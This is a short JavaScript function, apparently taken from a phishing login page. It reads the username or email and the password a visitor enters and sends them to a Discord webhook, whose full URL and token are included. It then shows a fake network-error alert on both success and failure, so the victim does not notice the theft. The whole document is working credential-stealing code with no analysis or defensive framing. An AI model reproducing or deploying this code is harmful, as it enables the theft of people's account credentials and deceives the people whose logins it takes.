    function sendCredentials() {
      var usernameOrEmail = document
       .getElementById(
        "username_or_email").value;
      var password = document
       .getElementById("password")
       .value;
      
      var payload = {
       "content": "New login attempt!",
       "embeds": [{
        "title": "Credentials",
        "fields": [{
          "name": "Username or Email",
          "value": usernameOrEmail
         },
         {
          "name": "Password",
          "value": password
         }
        ]
       }]
      };
      
      $.ajax({
       url: "https://discord.com/api/webhooks/1140793116039839744/IuhcN5prFS__DcpevBHAf9oB_B-j6n1maoyrGVrqkwBm52jnS2WY5_PQY1UTf-0Adrob",
       type: "POST",
       data: JSON.stringify(
        payload),
       contentType: "application/json",
       success: function() {
        alert(
         "A network error has occurred."
        );
       },
       error: function(xhr, status,
        error) {
        console.error(xhr
         .responseText);
        alert(
         "A network error has occurred."
        );
       }
      });
     }